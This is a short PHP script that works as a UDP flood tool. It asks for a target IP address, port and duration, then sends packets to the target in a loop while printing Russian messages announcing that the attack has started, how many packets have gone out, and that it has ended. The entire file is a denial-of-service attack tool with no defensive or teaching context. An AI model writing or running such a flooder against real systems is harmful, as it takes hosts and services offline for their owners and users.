<?php
$ip = readline("IP: ");
$port = readline("Port: ");
while($port < 1 or $port > 99999){
echo "Port must be a number 1-99999! \n";
$port = readline("Port: ");
}
$max = readline("Second: ");
while($max < 1 or $max > 10000000000000000000){
$max = readline("Second: ");
}
$max = $max * 3000000000;
echo "Атака началась \n";
$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
$data = "158000";
socket_bind($socket, "0.0.0.0", 9000);
$c = 0;
while($c < $max){
$c++;
socket_sendto($socket, $data, strlen($data), 0, $ip, $port);
$t = $max - $c;
$s = $t / 270000;
$t = round($s);
if($s == $t){
echo "Отправлено пакетов - {$c} \n";
}
}
echo "Атака закончилась \n";
?>
